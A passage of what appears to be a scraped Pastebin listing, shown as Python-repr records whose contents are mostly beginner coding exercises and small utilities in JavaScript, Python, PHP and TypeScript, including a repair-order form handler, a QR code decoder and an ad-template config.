12:46:38 +00:00', hash_val='8643ca00de48f8fb814c113cb1706960', url='/27LLDR46', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='HendarOfficial', title='btcbunch', content='pengencepetkaya?NGEPET', date='2022-06-01 12:45:19 +00:00', hash_val='fc5d8fe7f92d8fd38f6bd5e4848d452a', url='/QLzUVVFP', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Dragomana', title='Service', content='function solve() {\n\xa0 \xa0 let secComplete = document.getElementById(\'completed-orders\')\n\xa0 \xa0 let secRcvOrders = document.getElementById(\'received-orders\')\n\xa0 \xa0 let nameProd = document.getElementById(\'type-product\')\n\xa0 \xa0 let problemDesc = document.getElementById(\'description\')\n\xa0 \xa0 let client = document.getElementById(\'client-name\')\n\xa0 \xa0 let phone = document.getElementById(\'client-phone\')\n\xa0 \xa0 let btnSubmit = document.querySelector(\'button[type=""submit""]\')\n\xa0 \xa0 btnSubmit.addEventListener(\'click\', submitOrder)\n\xa0 \xa0 let btnClear = document.querySelector(\'#completed-orders > button\')\n\xa0 \xa0 btnClear.addEventListener(\'click\', (e) => {\n\xa0 \xa0 \xa0 \xa0 let divClear = e.target.parentNode\n\xa0 \xa0 \xa0 \xa0 while(divClear.children[3]){\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 divClear.children[3].remove()\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 })\n\xa0\n\xa0 \xa0 // problemDesc.value = \'Bad Battery\'\n\xa0 \xa0 // client.value = \'Some Name\'\n\xa0 \xa0 // phone.value = \'08888888\'\n\xa0 \xa0 \n\xa0 \xa0 function submitOrder(e) {\n\xa0 \xa0 \xa0 \xa0 e.preventDefault()\n\xa0 \xa0 \xa0 \xa0 \nif(!problemDesc.value || !client.value || !phone.value){\n\xa0 \xa0 return\n}\n\xa0\n\xa0 \xa0 \xa0 \xa0 let div = document.createElement(\'div\')\n\xa0 \xa0 \xa0 \xa0 let h2 = document.createElement(\'h2\')\n\xa0 \xa0 \xa0 \xa0 let h3 = document.createElement(\'h3\')\n\xa0 \xa0 \xa0 \xa0 let h4 = document.createElement(\'h4\')\n\xa0 \xa0 \xa0 \xa0 let btnStart = document.createElement(\'button\')\n\xa0 \xa0 \xa0 \xa0 let btnFinish = document.createElement(\'button\')\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 div.classList.add(\'container\')\n\xa0 \xa0 \xa0 \xa0 h2.textContent = `Product type for repair: ${nameProd.value}`\n\xa0 \xa0 \xa0 \xa0 h3.textContent = `Client information: ${client.value}, ${phone.value}`\n\xa0 \xa0 \xa0 \xa0 h4.textContent = `Description of the problem: ${problemDesc.value}`\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 btnStart.classList.add(\'start-btn\')\n\xa0 \xa0 \xa0 \xa0 btnStart.textContent = \'Start repair\'\n\xa0 \xa0 \xa0 \xa0 btnStart.addEventListener(\'click\', () => {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 btnFinish.disabled = false\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 btnStart.disabled = true\n\xa0 \xa0 \xa0 \xa0 })\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 btnFinish.classList.add(\'finish-btn\')\n\xa0 \xa0 \xa0 \xa0 btnFinish.textContent = \'Finish repair\'\n\xa0 \xa0 \xa0 \xa0 btnFinish.disabled = true\n\xa0 \xa0 \xa0 \xa0 btnFinish.addEventListener(\'click\', finishAction)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 function finishAction(e) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 let newDiv = e.target.parentNode\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newDiv.children[3].remove()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newDiv.children[3].remove()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 console.log(newDiv);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 secComplete.appendChild(div)\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 div.appendChild(h2)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(h3)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(h4)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(btnStart)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(btnFinish)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 secRcvOrders.appendChild(div)\n\xa0\n\xa0 \xa0 \xa0 \xa0 problemDesc.value = \'\'\n\xa0 \xa0 \xa0 \xa0 client.value = \'\'\n\xa0 \xa0 \xa0 \xa0 phone.value = \'\'\n\xa0 \xa0 }\n}', date='2022-06-01 12:09:10 +00:00', hash_val='115da38eddeceac882850d1e2ab4d1b6', url='/3Gh74aqt', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Tss_Flmzy', title='MVP для приложения "Пенькофф Инвестиции"', content="input_file = open('input.txt')\n\xa0\nn = int(input_file.readline())\nnames = dict()\nactioners = dict()\n\xa0\nfor line in input_file.readlines():\n\xa0 \xa0 line = line.split()\n\xa0\n\xa0 \xa0 answer = line[0]\n\xa0 \xa0 data = line[1:]\n\xa0\n\xa0 \xa0 if answer == 'BUY':\n\xa0\n\xa0 \xa0 \xa0 \xa0 name, actioner, count = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1\n\xa0\n\xa0 \xa0 \xa0 \xa0 count = int(count)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if name not in names:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name] = dict({actioner: int(count)})\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if actioner not in names[name]:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] = count\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] += count\n\xa0\n\xa0 \xa0 elif answer == 'SELL':\n\xa0\n\xa0 \xa0 \xa0 \xa0 name, actioner, count = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1\n\xa0\n\xa0 \xa0 \xa0 \xa0 count = int(count)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if name in names:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if actioner in names[name]:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] -= count\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if names[name][actioner] < 0:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] = 0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] = 0\n\xa0\n\xa0 \xa0 elif answer == 'PRICE_RAISE':\n\xa0\n\xa0 \xa0 \xa0 \xa0 actioner, percents = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 percents = float(percents)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1 + percents / 100\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] *= 1 + percents / 100\n\xa0\n\xa0 \xa0 elif answer == 'PRICE_FALL':\n\xa0\n\xa0 \xa0 \xa0 \xa0 actioner, percents = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 percents = float(percents)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1 - float(percents) / 100\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] *= 1 - float(percents) / 100\n\xa0\n\xa0 \xa0 elif answer == 'BALANCE':\n\xa0\n\xa0 \xa0 \xa0 \xa0 name = data[0]\n\xa0\n\xa0 \xa0 \xa0 \xa0 balance = 0\n\xa0\n\xa0 \xa0 \xa0 \xa0 if name in names:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (actioner, count) in names[name].items():\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 balance += count * actioners[actioner]\n\xa0\n\xa0 \xa0 \xa0 \xa0 print(round(balance))", date='2022-06-01 12:04:44 +00:00', hash_val='094f99d6ae436bec04858a7b6cb6315a', url='/3uzkDY3Q', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='Paste Ping', content='PasteBin API Check', date='2022-06-01 12:01:23 +00:00', hash_val='ce23c8313fe51c917a33b8b14e05f10a', url='/Sw34xvVF', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='MartinGeorgiev', title='01. SoftUni Reception', content='<?php\n\xa0\n$a = readline();\n$b = readline();\n$c = readline();\n$questions = readline();\n\xa0\n$answers = $a + $b + $c;\n\xa0\n$hours = ceil($questions/$answers);\n$hours += floor($hours / 3);\nif($hours%4==0&&$hours>1){\n$hours--;\n}\necho ""Time needed: {$hours}h."";', date='2022-06-01 12:00:18 +00:00', hash_val='14c49b3a1caf29db3dc122f325610662', url='/zcntj0cc', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='bokunda', title='QR Code decoder', content='import time\n\xa0\nimport cv2\nimport numpy as np\nfrom pyzbar.pyzbar import decode\n\xa0\ndef current_milli_time():\n\xa0 \xa0 return round(time.time() * 1000)\n\xa0\ndef decoder():\n\xa0\n\xa0 \xa0 startTime = current_milli_time()\n\xa0 \xa0 #image = cv2.imread(\'D:\\\\testv3\\\\.processed\\\\12206331010100012966101\\\\pera.tiff\')\n\xa0 \xa0 image = cv2.imread(\'C:\\\\Users\\\\spokimica\\\\Documents\\\\12200130010100012086591_20212210000623711\\\\_P_1.jpg\')\n\xa0\n\xa0 \xa0 gray_img = cv2.cvtColor(image,0)\n\xa0 \xa0 barcode = decode(gray_img)\n\xa0\n\xa0 \xa0 for obj in barcode:\n\xa0 \xa0 \xa0 \xa0 points = obj.polygon\n\xa0 \xa0 \xa0 \xa0 (x,y,w,h) = obj.rect\n\xa0 \xa0 \xa0 \xa0 pts = np.array(points, np.int32)\n\xa0 \xa0 \xa0 \xa0 pts = pts.reshape((-1, 1, 2))\n\xa0 \xa0 \xa0 \xa0 cv2.polylines(image, [pts], True, (0, 255, 0), 3)\n\xa0\n\xa0 \xa0 \xa0 \xa0 barcodeData = obj.data.decode(""utf-8"")\n\xa0 \xa0 \xa0 \xa0 barcodeType = obj.type\n\xa0 \xa0 \xa0 \xa0 string = ""Data: "" + str(barcodeData) + "" | Type: "" + str(barcodeType)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 print(""Barcode: ""+barcodeData +"" | Type: ""+barcodeType)\n\xa0\n\xa0 \xa0 endTime = current_milli_time()\n\xa0\n\xa0 \xa0 processingTime = endTime - startTime\n\xa0 \xa0 print(""Processing time: "" + str(processingTime) + "" [ms]"")\n\xa0\ndecoder()', date='2022-06-01 11:56:44 +00:00', hash_val='b90b5c5eb9eb895851f0f23a2b6e16c1', url='/meip76d6', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='szotyi41', title='Untitled', content="<?php\n\xa0\n$example = [\n\xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'content_name' => 'Babaváró',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'placeholders' => []\n\xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'content_name' => 'Személyi kölcsön',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'placeholders' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => true,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_2' => [\n\xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => true,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'headline_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 '_id' => 'abc124',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Vedd fel álmaid kölcsönét!',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Készpénzben!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'brand_image_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'asset',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 '_id' => 'abc123'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'path' => ''\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'cta_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Kalkulálj!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_name_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodName'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'product_image_1' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Other fields are unnecessary with source field\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'source_field',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'field' => 'prodImage'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 ]", date='2022-06-01 11:55:39 +00:00', hash_val='5d042ec2c74bc1c17328b696d76f7b0c', url='/SxuLkrXK', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Tss_Flmzy', title='Сжатие последовательности', content="input_file = open('input.txt')\n\xa0\nnums = list(map(int, input_file.readline().split())) + [-1]\n\xa0\nn = len(nums)\nk = 1\n\xa0\nfor i in range(1, n):\n\xa0\n\xa0 \xa0 if nums[i] - nums[i - 1] != 1:\n\xa0\n\xa0 \xa0 \xa0 \xa0 if k == 2:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - 2], end=',')\n\xa0 \xa0 \xa0 \xa0 elif k > 2:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - k], end='-')\n\xa0 \xa0 \xa0 \xa0 if i != n - 1:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - 1], end=',')\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 print(nums[i - 1], end='')\n\xa0 \xa0 \xa0 \xa0 k = 1\n\xa0\n\xa0 \xa0 else:\n\xa0\n\xa0 \xa0 \xa0 \xa0 k += 1", date='2022-06-01 11:54:04 +00:00', hash_val='32e4a8c11304839bfc25469c1c33d07f', url='/yyXjmkkd', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='attilan', title='Form utils', content="import { AbstractControl } from '@angular/forms';\n\xa0\ntype ControlChangeOptions = {\n\xa0 onlySelf?: boolean;\n\xa0 emitEvent?: boolean;\n};\n\xa0\nexport class FormUtils {\n\xa0\n\xa0 static readonly defaultOptions: ControlChangeOptions = {\n\xa0 \xa0 onlySelf: false,\n\xa0 \xa0 emitEvent: true,\n\xa0 };\n\xa0\n\xa0 /**\n\xa0 \xa0* Updates every value of given control array\n\xa0 \xa0*/\n\xa0 static patchControls<T>(\n\xa0 \xa0 controls: AbstractControl[],\n\xa0 \xa0 value: 